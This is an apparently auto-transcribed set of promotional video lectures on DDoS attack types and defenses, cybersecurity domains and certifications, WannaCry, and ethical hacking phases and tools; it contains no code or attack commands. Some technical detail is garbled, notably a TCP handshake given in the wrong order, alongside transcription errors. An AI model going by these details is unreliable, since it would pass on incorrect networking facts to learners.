even reputation gets hampered
there are a few industries that are more
susceptible to ddos attacks and
according to the cisco reports the
online gaming and the gambling industry
are a prime target
now let me talk about a few real-life
ddos attacks that have happened in the
past
our first example is the ddos attack
faced by dime dyne is an internet
performance management and web
application security company that was
acquired by oracle in 2016.
on october 21st 2016 dyne faced a
serious distributor denial of service
attacks that targeted systems operated
by dns provider dyn
the dos attack lasted roughly for a day
with spikes coming and going up to 1.5
terabits per second
reports state that attack was carried
out using a weapon called the mirai
botnet about 10 to 20 percent of all the
500 000 or so known mirai bots were
involved in addition to other devices
the findings revealed that mirai was the
primary source of malicious attack
traffic
the attack affected a large number of
users in north america and europe
several large businesses with high
traffic like amazon quora airbnb hbo did
new york times twitter visa and cnn were
affected
our next example is amazon web services
a subsidiary of amazon which works on
providing on-demand cloud computing
platforms
in the month of february 2020 amazon
stated that aws shield observed and
mitigated a 2.3 terabits per second ddos
attack aws shield a managed edos
protection service that is responsible
for safeguarding applications running on
aws mitigated this attack
the attack was carried out using hijack
servers and cost three days of elevated
threat for its aws shield staff
the ddos attack had a peak volume
traffic of 2.3 terabits per second which
is the largest ever recorded
detailing the attack in its q1 2020
threat report amazon said its aws shield
service mitigated the largest ddos
attack ever recorded stopping a 2.3
terabits per second attack in mid
february this year now that we have seen
a few real-life tdos attacks let's move
on to understanding what exactly a ddos
attack is
you might have often come across the
word denial of service attack right so
is it the same as ddos well they differ
with respect to a few parameters a
denial of service attack takes place
when a computer is used to flood the
target server or network with traffic by
doing so its resources and bandwidth are
exhausted the motive of the attack is to
deny normal legitimate service requests
and user access
as you can see in this image we have the
attacker's computer sending traffic to
the target server here
now let's speak a bit about the ddos
attack
a ddos attack works closely like a
denial of service attack the only
difference is that here multiple systems
are used to launch the attack you can
call ddos attack as a large-scale attack
operation based on a denial of service
attack ddos stands for distributed
denial of service here several systems
target a single system with malicious
traffic when multiple systems are used
the attacker can put the system offline
more easily
ddos attack is faster than a normal
denial of service attack and ddos
attacks are difficult to trace
from this image you can see that
multiple systems are used to launch this
attack the systems together flood the
target system with massive traffic
now that we know what a ddos attack is
let's try and understand the motive
behind these attacks
the first reason can be guessed well by
all of you and that is for ransom just
like any other cyber attack the primary
reason is monetary gain a website owner
can be asked to pay a ransom for
attackers to stop a ddos attack
the ransom prices to stop the ddos
attacks vary from small amounts to hefty
amounts of money in most cases the
ransom is usually charged in bitcoins
the second reason is hacktivism or
protest hacktivism occurs with the
intention of spreading a message
the aim of this is to usually protest
against an ideology of a political
agenda
the target of many hacktivists and ddos
attacks are government financial or
business websites
attackers launch ddos attacks to shut a
website say for a political reason thus
trying to make a statement
a person with a financial or an
ideological motive is capable to damage
an organization by launching a ddos
attack against it
lastly these attacks can be carried out
for a specific reason called targeted
attacks for example it can be done to
damage an organization's reputation it
is to be noted that ddos attacks can be
deployed against big or small sites and
can be driven by either competition or
pure boredom
or also for the need for challenge the
magnitude of these attacks can vary from
small to big
let's now move on and understand a
little more about the working of a ddos
attack
an attacker is required to gain control
of a network of online machines in order
to carry out a ddos attack
computers and various other iot devices
are infected with malware and these turn
into a bot also known as a zombie a
group of such bots is called a botnet
once a botnet is created the attacker
takes over the remote control access
a ddos is usually launched through a
network of remotely controlled bots or
hacked computers
botnets can range from hundreds to
thousands of computers controlled by
hackers it is possible that your
computer could be a part of a botnet
without even you knowing it
the next step is to target the ip
address of the victim by the botnet
once this is done each bot will bombard
the target with fake service requests
the botnets send more connection
requests than a server can handle in
some cases they send huge volumes of
data that exceed the bandwidth range of
the victim
by doing so the targeted server or
network will overflow and thus resulting
in a denial of service to normal traffic
it is not possible to identify the bot
as it looks like a legitimate internet
device
a successful ddos attack slows a website
prevents users from accessing it
resulting in financial losses and
performance issues
so now that you know how a ddos attack
is carried out let's have a look at the
types of ddos attacks
different ddos attack vectors target the
different components of a network
connection ddos attacks can be divided
into three types
they are volume based attacks protocol
attacks and application layer attacks
let's have a look at each one of these
attacks
first up we have the volume based ddos
attack as the name suggests this attack
depends on the volume of the inbound
traffic to the target
this attack aims at overloading the
website's bandwidth or causes usage
issues
it creates a congestion by consuming all
the available bandwidth here massive
volumes of data are sent to the victim
by using a form of an application or
request from a botnet it is very simple
the more the volume the higher the
success rate of the attack
the volume-based dos attacks include udp
floods pink that is icmp floods and
other spoofed packet floods
now let's have a look at an example of
the volume based attack that is the ping
icmp flood attack the internet control
message protocol icmp which is utilized
in a pink flood attack is an internet
layer protocol used by network devices
to communicate an icmp flood attack also
known as ping flood attack is one of the
most common denial of service attacks
here the attacker overwhelms the target
device with icmp eco requests
basically icmp eco request and eco reply
messages are used to ping a network
device to check the connection between
the sender and the receiver an icmp
request requires resources and bandwidth
to process and reply to the requests
by flooding the target with request
packets the network is forced to respond
with an equal number of reply packets
thus making it unserviceable to normal
traffic
attackers would usually spoof in a bogus
ip address in order to mask the sending
device
the next type of ddos attack we will be
discussing about is the protocol based
attack
when you learn networking you will know
that the internet is based totally on a
set of protocols protocol attacks cause
a service disruption by consuming
intermediate communication equipment
like firewalls and load balancers
ddos attacks based on protocols exploit
weaknesses in layer 3 and layer 4
protocol stacks protocol based attacks
exploit your network by sending either
more packets than what your server can
manage or more bandwidth than what your
network ports can hold
this attack includes syn floods ping of
death and smurf ddos to name a few
here we will have a look at an example
of the protocol based attack that is the
syn flood attack
here the attack exploits the tcp
handshake in a regular tcp network
transaction there is a three-way
handshake namely the sin
the acknowledgement and the sin
acknowledgement
the sin is a service request the act
that is also known as the
acknowledgement is the response from the
target and the sim acknowledgement is
the original requester replying with
something like a thanks in return
whereas in the syn flood attack the syn
packets are created with fake ip
addresses by the attackers the target as
per the protocol then sends an
acknowledgement to the dummy address
unfortunately this dummy address never
responds
this is carried out a number of times
the target waits for the final step in
the handshake and in turn it exhausts
its resources in the process
next up we have the application layer
attack the main motive of this attack is
to bring down an online service or a
website
these attacks are comparatively smaller
but silent
application layer attacks are also known
as layer 7 attacks
and it not only targets the application
but also the network and its bandwidth
application layer attacks include get
and post floods
low and slow attacks and more let's have
a look at the famous http flood attack
as an example
http flood is a type of distributed
denial of service attack in which the
attacker exploits legitimate looking
http get or post requests to attack a
web server or an application
here large numbers of http requests
flood the server resulting in denial of
service
http has generally two types of requests
get or post a get request is used to
retrieve information while a post
request is often used when submitting a
completed web form or when uploading a
file
usually http flood attacks are harder to
detect and block
a http flood attack sends what appears
to be legitimate http get or post
requests to attack a web server or an
application these flooding attacks often
rely on a botnet
now that we had a look at the types of
ddos attacks let's understand the
measures we need to take up in order to
prevent these attacks
the first step is to acquire more
bandwidth you must make sure that you
have ample bandwidth to handle any
spikes and traffic caused due to
malicious activity
currently with attackers being more
careful having more bandwidth raises the
bar which the attackers have to overcome
before launching a successful ddos
attack this is a good preventive step
next make sure to develop a ddos
response plan ready usually when a ddos
attack takes place there is very less
time to plan hence it is wise to define
a plan in advance as it will avoid and
minimize any impacts
to do this job first you would have to
develop an incident response plan also
make sure your data center is prepared
and your team knows what to do
the standard key elements include system
checklist forming a response team which
should include the list of internal and
external contacts as well
and the last being securing your network
infrastructure this can be done with the
help of ips that is intrusion prevention
systems which combine firewalls vpn load
balancing and other layers of ddos
defense techniques
our third point is to configure network
hardware against an attack
at times small hardware configuration
changes can help you prevent a ddos
attack this is most often overlooked
also make sure to protect your dns
servers as attackers can bring down your
website and web servers offline by
attacking your dns servers
next point is to leverage the cloud the
conventional ddos mitigation solutions
oversize the network bandwidth and
require complex hardware which proves to
be costly and also ineffective
whereas cloud has greater bandwidth and
resources
cloud-based apps can absorb malicious
traffic way before it reaches its
intended destination therefore it is
good to outsource ddos prevention to
cloud-based service providers
our fifth point involves monitoring your
website traffic regularly for unusual
activities
it is a great thing if your website gets
millions of new visitors in nr but isn't
that also suspicious
a sudden increase in traffic is an
alarming situation
hence have alerts set up in the event
you exceed a threshold specific to the
number of requests targeting your site
considering the time and place of the
inbound traffic is also a good step
a ddos attack usually gives a few red
flags before it happens your team should
be wise enough to spot them beforehand
the signs of such an attack for example
will be your website being unresponsive
or responding slowly intermittent
website shutdowns or probably the user
having problems accessing the website if
these issues are prolonged then the
network is likely experiencing a ddos
and an action should be taken
immediately
the next step is to keep everything up
to date this might sound basic but it
goes a long way all the systems should
be kept up to date to make sure that any
issues or bugs are fixed it is always
good to detect threats at an early stage
finally you can make use of ddos
prevention tools like inferva cloud fair
f5 networks arbor ddos and black lotus
to name a few
these tools are very effective for
example cloudfest layer 3 and 4
protection absorbs an attack before it
reaches the target server this is not
achievable by using firewalls load
balancers and routers
taking an example of arbor ddos it is to
be noted that it can deal with large
volumes of malicious traffic without
disrupting the regular traffic this
software is used to mostly protect
enterprise or web hosting services
now let's have a look at something
interesting
we will speak a bit about the digital
attack map
as you see on your screens it is a data
visualization of ddos attacks across the
world it is built through a
collaboration between google ideas and
arbor networks you can have a look at it
and explore the various features it has
like which part of the world and when a
ddos attack is happening you can also
get all the stats related to the attack
digital attack map lets you learn about
past trends and find reports of outages
happening on a given day make sure to
check this out
now that you know all about a ddos
attack and if you are interested in
becoming a cyber security expert and
want to work on designing security
systems and prevent cyber attacks then
simply learn can help you achieve your
dreams
simply learn provides a cyber security
expert masters program with foundational
intermediate and advanced security
skills through leading certification
courses including security plus ceh cism
cissp and cecsb
with the increasing number of job
opportunities in the field of cyber
security this certification course will
provide to be an advantage there are no
prerequisites for this program however
knowledge of any programming language is
recommended but again not mandatory
let's see how do we become a
cybersecurity expert so essentially who
is a cyber security expert a cyber
security expert is an individual
employed by an organization to protect
their infrastructure right so this
person is responsible to identify
potential flaws identify
what threats the organization faces and
then streamline or create or design or
architect methodology which is going to
protect all the assets that the
organization has so this is going to
happen through a variety of techniques
such as finding weaknesses so
vulnerability management where you run
vulnerability scanners identify
potential flaws in
the organization's infrastructure could
be applications could be servers could
be desktops could be operating systems
could be anything could be network-based
flaws as well and then you're going to
monitor these systems you're going to
look at uh the data flow that is going
to the internet through the network
through the intranet rather and then
you're going to check if there is
anything malicious going on in that
network so
over these techniques you're basically
going to monitor it on a day-to-day
basis on a regular basis and you're
going to try to identify if anything out
of the ordinary is happening right after
you find the weakness you're going to
test those weaknesses to identify the
complexity of those weakness to validate
those weakness actually exist and then
you're going to repair them you're going
to patch them you're going to install
updates or you're going to prevent
you're going to install mechanisms like
firewalls or antiviruses to mitigate
those weaknesses and you're going does
resulting in strengthening the areas
where an attack may have occurred let's
see the domains in cybersecurity now
when we say domains in cyber security in
the previous slide we were discussing
where these attacks may happen like
applications infrastructure uh network
so let's see these domains in details
asset security now when we say assets
assets could be applications could be
networking devices could be computers
could uh could be routers it could be
wireless access points uh and these uh
all these devices have their own
operating systems they have their own
functionality and it is important that
we look at the security of each and
every asset that the organization owns
security architecture and engineering
now
not everyone can just walk in an
organization
and then say let's start implementing as
uh in implementing security in a
particular manner we have to standardize
the security in such a way where the
security is constant for a long period
of time and is consistent right so for
that to happen there is an architecture
an engineering phase where we are going
to create a plan of how this security
needs to be implemented for example if i
determine to install a particular
antivirus i have to ensure that the same
antivirus is installed on all the
systems in the organization i cannot
have different kind of antiviruses
installed uh that do not talk to each
other or do not report properly uh to
the proper owner so we have to create
policies procedures and we have to
implement them in a standardized manner
for our security to work properly
communication and network security now
with cloud computing coming in
and hybrid clouds happening where you
got a
deployment of a physical infrastructure
talking to something that is on the
cloud let's say aws or microsoft azure
right and data flows are happening
globally these days you have to be very
careful how these data are going to be
transmitted across the network thus you
have to create those paths and ensure
that those parts are monitored properly
are regulated properly and do not have
any data leakages similarly identity and
access management who is accessing my
data are they authorized to access my
data and if yes how am i going to
authenticate them how am i going to
track them home how am i going to hold
them accountable for whatever they have
done even if a person is authorized to
do something we have to hold him
accountable for that activity so that if
something something happens later on we
can identify who made that change so the
identity and access management module
will consist of us creating groups
policies users roles and interlinking
them with the assets to ensure that only
authorized people are able to access
those devices security operations on a
day-to-day basis we need to monitor the
security of the organization for example
if today i start facing a denial of
service attack or somebody starts a
password attack on my organization where
they're trying to crack somebody's
password there should be some internal
mechanisms that are in place which will
try to identify these attacks one the
appropriate administrator and that
administrator will walk in and try to
investigate that attack so day-to-day
operations are a must security
assessment and testing now that we are
all have these mechanisms in place are
they going to remain constant for the
rest of our lives no i.t is a ever
evolving scenario so we need to assess
and test our security controls on a
regular basis to ensure that there are
no gaps left what i configure today may
be irrelevant tomorrow so i have to
constantly keep on looking at the latest
security trends the latest
vulnerabilities that are being
identified the patches that are being
installed and have to compare my
infrastructure to all of these to see
that i am compliant with the latest
security standards software development
security so if you're an organization
who's developing software and who's
going to sell that software to end users
security becomes a huge part because the
end user or the buyer if it is an
organization is going to ask what kind
of security testing was done in that
application so that brings us to a
software development life cycle which a
life cycle which talks about how you're
going to create that code how you're
going to test that code ensure that the
code is secure enough so you need to
follow secure coding practices and
you're going to test the software over
and over again till you're satisfied
with the outcome and then security and
risk management now uh when we come to
risks risks are basically events that
may occur compromising the security of
an organization so it is very important
that we identify these risks we map
these risks we verify how that risk is
going to impact the business and then
try to figure out security controls to
mitigate that risk or
bring it down to manageable aspects so
that's a lot of talk that's a lot of
domains that's a lot of attacks that we
have discussed now let's see what kind
of courses and certifications are
available for us to enhance our careers
and address all of these domains all of
these attacks so starting off from a
technical perspective where we are going
to look at ethical hacking or security
where we are going to assess and do a
vulnerability assessment and penetration
test there are certifications from
compchia like security plus or from ec
council which is the certified ethical
hacking training which basically allows
us to become vulnerability assessment
and penetration testing experts so we'll
be technically testing each and every
device and trying to hack those devices
to see
if that vulnerability is real and what
can be attained out of that
vulnerability cissp is very high level
uh is a very high level certification
that normally
is considered as a management level
certification right so just to get
certified yourself you need at least
five years of experience in the iit
security field
this is where you get certified and
you're basically a chief information
security officer where you're going to
develop policies procedures and security
control mechanisms and you're going to
standardize the security policy of the
entire organization then you've got the
cisa or also known as the csa certified
information systems auditor it is from
an organization called asaka it's more
on the system side where you're going to
audit systems and you're going to verify
that they are adhering to the policies
that you have implemented the cism or
system is the certified information
security manager this is again a
project based oriented approach where
you're going to manage the security of
an organization and you're going to look
at all the daily operations of the
security operations center and you're
going to maintain and manage all of
those functions overall when we talked
about risk assessment and risk strategy
for that we've got the ca crisc which is
certified in risk and information
systems control now for these
certifications this is more on the
business side of everything where you
understand the business processes you
understand the business requirements and
based on those business requirements you
compare the technical implementations of
compute of computing powers that you
have implemented and then you are going
to compare how those technical aspects
can be converted into a risk for example
a vulnerability assessment identifies a
possible sequel injection attack now
technically it becomes technically it
becomes a big risk however which system
is made we are being affected if that
system gets compromised what kind of
losses is the organization looking at
how much are they going to be what kind
of losses the organization are looking
at are they looking at lawsuits from
their customers are they looking at
penalties from regulatory authorities so
that risk that
implied risk that this if this
vulnerability is hacked that is the
aspect that you want to look at when
you're looking at risk information and
controls similarly you have ccsp this is
a certified cloud security professional
certification so this is especially for
people who want to deal with the cloud
uh let it be a public
cloud a private cloud or a hybrid cloud
this certification gives you an
architectural overview over different
aspects of cloud and how you want to
implement security in a cloud-based
scenario so simplylearn offers all of
these certifications with trainings from
certified professionals so there's a
master's program from simplylearn which
talks about becoming a cybersecurity
expert which includes all of these
trainings once you have these kind of
trainings uh and you get those
certifications on your profile that's
where you're basically a cyber solutions
or cyber security expert and you'll be
designing and developing security
policies structures architectures for
various organizations and helping them
enhance the security of their
infrastructure we humans are highly tech
savvy in today's times
with the extensive use of the internet
and modern technologies there is a
massive challenge in protecting all our
digital data such as net banking
information account credentials and
medical reports to name a few have you
heard about the deadly wannacry
ransomware attack the attack happened in
may 2017 in asia and then it spread
across the world
within a day more than 230 000 computers
were infected across 150 countries
the wannacry cryptoworm encrypted the
data and locked the users out of their
systems
for decryption of the data the users
were asked for a ransom of 300 to 600 in
bitcoin
the users who use the unsupported
version of microsoft windows and those
who hadn't installed the security update
of april 2017 were targeted in this
attack
the wannacry attack took a toll on every
sector top tier organizations like
hitachi nissan and fedex had to put
their businesses on hold as their
systems were affected too
now this is what you call a cyber attack
to prevent such attacks cyber security
is implemented
we can define cyber security as the
practice of protecting networks programs
computer systems and their components
from unauthorized digital attacks these
illegal attacks are often referred to as
hacking
hacking refers to exploiting weaknesses
in a computer network to obtain
unauthorized access to information a
hacker is a person who tries to hack
into computer systems
this is a misconception that hacking is
always wrong there are hackers who work
with different motives
let's have a look at three different
types of hackers black hat hackers are
individuals who illegally hack into a
system for a monetary gain on the
contrary we have white hat hackers who
exploit the vulnerabilities in a system
by hacking into it with permission in
order to defend the organization this
form of hacking is absolutely legal and
ethical hence they are also often
referred to as ethical hackers
in addition to these hackers we also
have the grey hat hackers as the name
suggests the color gray is a blend of
both white and black
these hackers discover vulnerabilities
in a system and report it to the
system's owner which is a good act
but they do this without seeking the
owner's approval
sometimes grey hat hackers also ask for
money in return for the spotted
vulnerabilities
now that you have seen the different
types of hackers let's understand more
about the hacking that is legal and
valid ethical hacking through an
interesting story dan runs a trading
company he does online training with the
money his customers invest everything
was going well and dan's business was
booming until a hacker decided to hack
the company's servers the hacker stole
the credentials of various trading
accounts he asked for a lump sum ransom
in exchange for the stolen credentials
dan took the hacker's words lightly and
didn't pay the hacker
as a result the hacker withdrew money
from various customers accounts and dan
was liable to pay back the customers
dan lost a lot of money and also the
trust of his customers
after this incident dan gave a lot of
thought as to what could have gone wrong
with the security infrastructure in his
company
he wished there was someone from his
company who could have run a test attack
to see how vulnerable his systems were
before the hacker penetrated into the
network
this was when he realized he needed an
employee who thinks like a hacker and
identifies the vulnerabilities in his
network before an outsider does
to do this job he hired an ethical
hacker john
john was a skilled professional who
worked precisely like a hacker in no
time he spotted several vulnerabilities
in dan's organization and closed all the
loopholes
hiring an ethical hacker helped dan
protect his customers from further
attacks in the future
this in turn increased the company's
productivity and guarded the company's
reputation
so now you know hacking is not always
bad
john in this scenario expose the
vulnerabilities in the existing network
and such hacking is known as ethical
hacking ethical hacking is distributed
into six different phases
let us look at these phases step by step
with respect to how john our ethical
hacker will act before launching an
attack the first step john takes is to
gather all the necessary information
about the organization's system that he
intends to attack this step is called
reconnaissance he uses tools like nmap
and h-ping for this purpose
john then tries to spot the
vulnerabilities if any in the target
system using tools like nmap and expose
this is the scanning phase
now that he has located the
vulnerabilities he then tries to exploit
them
this step is known as gaining access
after john makes his way through the
organization's networks he tries to
maintain his access for future attacks
by installing back doors in the target
system
the metasploit tool helps him with this
this phase is called maintaining access
john is a brilliant hacker hence he
tries his best not to leave any evidence
of his attack
this is the fifth phase clearing tracks
we now have the last phase that is
reported
in this phase john documents a summary
of his entire attack the vulnerabilities
he spotted
the tools he used and the success rate
of the attack
looking into the report dan is now able
to take a call and see how to protect
his organization from any external cyber
attacks
don't you all think john is an asset to
any organization if you want to become
an ethical hacker like john
then there are a few skills that you
need to acquire
first and foremost you need to have a
good knowledge of operating environments
such as windows linux unix and macintosh
you must have reasonably good knowledge
of programming languages such as html
php python sql and javascript
networking is the base of ethical
hacking hence you should be good at it
ethical hackers should be well aware of
security laws so that they don't misuse
their skills
finally you must have a global
certification on ethical hacking to
successfully bag a position of an
ethical hacker like john
few examples of ethical hacking
certification are certified ethical
hacker certification ceh comptia pentest
plus
and licensed penetration tester
certification to name a few
simplylearn provides a cybersecurity
expert masters program that will equip
you with all the skills required by a
cybersecurity expert
you could have a look at it by clicking
the link in the description the endless
growth of technologies in this area is
directly proportional to the number of
cyber crimes
cyber crimes are estimated to cost six
trillion dollars in 2021 hence to tackle
these cyber crimes organizations are
continuously on the lookout for cyber
security professionals
the average annual salary of a certified
ethical hacker is 91 000 in the us and
approximately rupees seven lakhs in
india
so what are you waiting for get
certified and become an ethical hacker
like john and put an end to the cyber
attacks in the world
so let's talk about hacking and what
exactly hacking is hacking refers to
exploiting weaknesses in a computer
network to obtain unauthorized access to
information a hacker is a person who
tries to hack into computer systems now
here there are some keywords that we
need to understand first and foremost
exploit when you are exploiting
weaknesses weaknesses are technically
called vulnerabilities which are
basically design flaws misconfiguration
errors usage of default usernames and
passwords which have not been modified
so any misconfiguration or anything that
has been left behind by a security
administrator that can be misused which
means exploited by a hacker to gain
unauthorized access so the next term is
unauthorized access something that
you're not allowed to do and when you
say a hacker is a person who tries to
hack it's basically a person with
malicious intent trying to gain access
to a system or a resource that they are
not authorized to access in the first
place how do they do it they find a
vulnerability that is a weakness or a
flaw and then they misuse it to gain
access to that particular network so
here in the diagram you can see that a
sender on the left hand side is trying
to send some data to the receiver on the
right hand side the hacker would try to
gain unauthorized access to the
transmission that is being sent and
would try to capture the data packets
and read the secrets within let's look
at a business case scenario into hacking
now there is an organization everybody
is going around their own business when
they realize that their systems may have
been compromised now they're trying to
look at the customer data to ensure that
that has not been compromised and trying
to assure the customers however they do
realize that some customer data has been
lost and even the company reports have
been modified as well now this is the
scenario where there have been some
security controls in place and those
controls have been identified they
realized that there is an attack that
has happened and based on that attack
they have realized that the data has now
been compromised and the records have
been modified
by the hacker which means that the data
is no longer trustworthy and thus cannot
be used by the business for any legal
transactions so then the hacker gives a
call to the organization or gets
connected to the organization demanding
a ransom for the data to be replaced to
be taken back into the original state
where it was trusted and thus the
organization can utilize it for business
transactions the organization has
probably no backup so they decide that
they want to pay the lump sum to the
hacker to restore that data so that they
can continue on with the business does
money exchanges and the hacker is able
to restore that data and the business
continues that as usual however the
activity here of a hacker trying to
leverage the misconfiguration of the
weaknesses in the organization's
security thus being able to hack them
and
make these ransomware demands so the
company then wants to figure out even if
having a security system in place how
was the hacker able to hack their
systems thus one of the employees comes
up with a brilliant idea of identifying
vulnerabilities in the network to
proactively search for any flaws that
have been left behind
so that they can plug those flaws and
nobody can misuse them
thus they figure out that they want to
hire an ethical hacker who would help
them identify the security posture of
the organization identify the weaknesses
vulnerabilities and flaws and help them
remedy those flaws so that in future
scenarios these scenarios will not
happen so before we go into an ethical
hacker let's understand what are the
types of hackers so what are the types
of hackers hacker is a technically
skilled person who is very adept with
computers they have good programming
skills they understand how operating
system works they understand how
networks work they understand how to
identify flaws and vulnerabilities
within all of these aspects and then
they understand and know how to misuse
these flaws to get a outcome which would
be detrimental to the health of the
organization
so there's six type of hackers that have
been identified black hat hackers white
hat hackers grey hat script kiddies
nation's players sponsored hackers and a
hacktivist so black hat hackers are
patient basically
the malicious hackers who have malicious
intent and have criminalistic tendencies
they want to harm the organization by
hacking into their infrastructure by
destroying their infrastructure by
destroying the data so that they can
gain from it from a monetary perspective
these guys are also known as crackers
the main aspect of these people are that
they have malicious intent they try to
do unauthorized activities and they try
it for personal gain another important
aspect to remember is that a black hat
hacker will always try to hide their
identity they will spoof their online
digital identity by masking it by
spoofing their ip addresses mac
addresses and try to remain anonymous on
the network a white hat hacker on the
other hand is also an ethical hacker or
a security analyst who's an individual
who will do exactly the same thing that
a black hat hacker would do minus the
malicious intent plus the intent of
helping the organization identifying the
flaws and remedying them so that nobody
else can misuse those vulnerabilities so
they are authorized to act on the
company's behalf they are authorized to
do that activity which would help the
company identify those flaws and thus
help the company mitigate those flaws
improving on their security portion so
these uh these kind of security experts
or ethical hackers would help
organizations defend themselves against
unauthorized attacks grey headhackers is
a blend of both white hat and black hat
hackers so here they can work
defensively and offensively both they
can accept contracts from organizations
to increase their security posture at
the same time they can also get
themselves involved in malicious
activities towards other organizations
to personally gain or benefit from them
by doing unauthorized activity script
kitties are people
who are technically
not much aware about what hacking is uh
they rely on existing tools that have
been created by other hackers they have
no technical knowledge of what they're
doing it's just a hit or miss for them
so they just get their hands on a tool
they try to execute those tools uh if
the hack works it works otherwise it
doesn't so these people are basically
who are noobs or newbies who are trying
to learn hacking or uh just uh people
who with malicious intent who just want
to have some fun or trying to impress
people around then we have the nation or
the state-sponsored hackers as the name
suggests these hackers are sponsored by
their government now this may not be a
legitimate job but most of the
governments do have uh hackers enrolled
in their pay on on their organizations
to spy on their enemies to spy on
various countries and try to figure out
the aspirations of those countries so
this is basically a spying activity
where you are technically trying to get
access to other countries resources and
then try to spy on them to figure out
what their activities have been or what
their future plans have been and then we
have the hacktivist who is an individual
who has a political agenda to promote
and they promote it by doing hacking so
these guys what is the difference
between a black hat hacker and a
hacktivist the black hat hacker may try
to hide their identity the hacktivist
will claim responsibility of what they
have done so for them it's a political
agenda political cause and they will try
to hack various organizations to promote
their cause they would probably do this
by defacing the website and posting the
messages that they want to promote on
these websites so what exactly is
ethical hacking then we have discussed
the types of hackers we have identified
a malicious hacker as a black hat hacker
with the intent
of doing harm to an organization's
network for personal gain we have
discussed what the ethical hacker is so
an ethical hacker would be doing the
same activity but in an authorized
manner so they would have legal
contracts that they would be signing
with the organization it would give them
a definite scope of what they are
allowed to do and what they are not
allowed to do and the ethical hackers
would function within those scopes would
try to execute those test scenarios
where they would be able to identify
those flaws or those system
vulnerabilities and then they would be
submitting a report to the management of
what they have found they would also
help the management to mitigate or to
resolve those weaknesses so that nobody
else can misuse them later on they might
use the same techniques and the same
tools that black hat hackers do however
the main difference here is that these
guys are authorized to do that
particular activity they're doing it in
a controlled manner with the intent of
helping the organization and not with
the intent of personal gains so who's an
ethical hacker again an ethical hacker
is a highly intelligent highly educated
person who knows how computers function
how programming languages work how
operating systems work they can
troubleshoot they're technically very
adept at computing they understand the
architecture they understand uh how
various components in a computer work
they can troubleshoot those components
and they can basically be very good with
programming as well now when i say
programming we don't want the ethical
hacker to be a good developer of
applications we want them to understand
programming in such a way that they can
create scripts they can write their own
short programs like viruses worms
trojans or exploits which should help
them achieve the objective that they
have set out for so uh here you can see
the ethical hacker they are individuals
who perform a security assessment of the
companies with the permission of cons
concerned authorities so what is a
security assessment a security
assessment is finding out the exact
security posture of the organization by
identifying what security controls are
in place how they've been configured and
if there are any gaps in the
configurations themselves so an
organization will hire a hethical hacker
they would give the ethical hacker the
information about what information is or
what security controls what firewalls
now what idss ipss introducing detection
or intuition prevention systems
antiviruses are already in place and
then they will ask the ethical hacker to
figure out a way to bypass these
mechanisms and see if they can still
hack the organization what is the need
of an ethical hacker the need of an
ethical hacker is proactive security the
ethical hacker would identify all the
existing flaws in an organization and
try to resolve those laws to help secure
the organization from black hat hackers
so ethical hackers would prevent hackers
from cracking into an organization's
network by securing the organization by
improving on their security on a
periodic basis and they would also try
to identify system vulnerabilities
network vulnerabilities or application
level vulnerabilities that would have
been missed or have already been missed
and then tried to figure out a way of
plugging them or
resolving them so that they cannot be
misused by other hackers they would also
analyze and enhance an organization
security policies now what are policies
policies are basically documents that
have been created by an organization of
rules that all the employees need to
follow to ensure that the security of an
organization is maintained for example a
password policy a password policy would
help users in an organization to adhere
to the standards the organization has
identified for a password complexity for
example a password when a user is
creating them should adhere to standards
where they are using random words they
are they contain the alphabet a through
z uppercase and lowercase 0 through 9 as
numerics and special characters and
they're randomized so that the password
becomes much more stronger to prevent
from brute force attacks so what would
an ethical hacker do at this point in
time they would try to test the strength
of the passwords to see if brute force
attacks or dictionary attacks are
possible and if any of these passwords
can be cracked they will ensure that all
the employees are following the policies
and all the passwords are as secured as
the policies want them to be if there
are any gaps in the policies or the
implementation of the policy it is the
ethical hacker's responsibility to
identify those gaps and warn the
organization about it similarly they
would also try to protect any personal
information any data that is owned by
the organization that is critical for
the functioning of the organization and
they will try to protect it by from
falling into the hacker's hands now what
are the skills that are required of an
ethical hacker these are the following
skills so first and foremost they should
have good knowledge with operating
systems such as windows linux unix and
mac now when we say knowledge about
operating systems it's not only about
how to use those operating systems but
how to troubleshoot those operating
systems how these operating systems work
how these operating systems need to be
configured how can they be secured for
example securing an operating system is
not only installing a firewall and an
antivirus but you need to configure
permissions on an operating system of
what users are allowed to do and what
users are not allowed to do for example
limiting the installation of
applications how are we going to do that
we need to go into the system center the
security center of windows and we need
to configure security parameters over
there of what are acceptable softwares
and what are not same with linux and mac
softwares operating systems so we need
to know how we can secure these
operating systems similarly all of these
would have desktop versions and server
versions of operating systems as an
ethical hacker we need to know the
desktop and server versions both how to
configure them and how to provide
services within the organization on
these servers so that they can be
consumed in a secure manner by all the
employees at the same time they should
also be knowledgeable of programming
languages or scripting languages such as
php python ruby html for programming if
you will because web servers come into
the picture so again they should not be
great developers where they can create
huge applications but they should be
able to develop scripts understand those
scripts analyze those scripts and figure
out what the output should be of those
scripts to achieve the hacking goals
that they have set out for an ethical
hacker should have a very good
understanding about networking no matter
whether you're in application security
you're in network security or you're in
host-based security since a computer
will always be connected to a network
either a local area network like a lan
or the internet we should know how
networking works we should know the
seven layers of the osi model we should
know which protocols work on those seven
layers we should identify the tcp model
and how osi model can be mapped to the
tcp model we should understand how tcp
and udp work how how each and every
protocol is crafted how they are
supposed to behave for us to analyze and
understand any network based attacks we
should be very good in security measures
so we should know where those
vulnerabilities would lie what are the
latest exploits available in the market
and we should be able to identify them
we should be able to know the techniques
and the tools of how to deal with
security how to analyze security and
then how to implement security to
enhance it as well along with that it is
important that a security analyst or
ethical hacker is aware of the local
security laws and standards why is that
because an organization cannot do any
illegal activity whatever responses that
they have whatever security mechanisms
whatever security controls they will
implement they need to be adhering to
the local law of the land they should be
legal in nature and should not cause
undue harm to any of the employees or
any of the third party clients that
they're dealing with so the ethical
hackers should be aware of what security
laws are before they implement security
controls or even before they start
testing for security controls and all of
these should be backed up by having a
global certification or a globally valid
certification related to networking
related to security ethical hacking the
law of the land anything and everything
maybe even programming it's good to have
a certification in php perl python ruby
and so on so forth why because most of
the organizations when they hire ethical
hackers look out for these
certifications especially globally valid
certifications so that they can be sure
or they can be assured that the person
that they are hiring has the required
skill set so let's talk about a few of
the tools that a ethical hacker would
utilize uh in the testing scenarios to
be honest there are hundreds of tools
out there what you see on the screen are
just a few examples of them uh nessus is
a vulnerability scanner what is a
vulnerability scanner it is an automated
tool that is designed to identify
vulnerabilities within hosts within
operating systems within networks so
they come with their ready-made
databases of all the vulnerabilities
that have already been identified at the
scan the network against that database
to find out any possible flaws or any
possible vulnerabilities that currently
exist on the host or the operating
system or on the network similarly there
would be application scanners like
acunetix or arachne that would help you
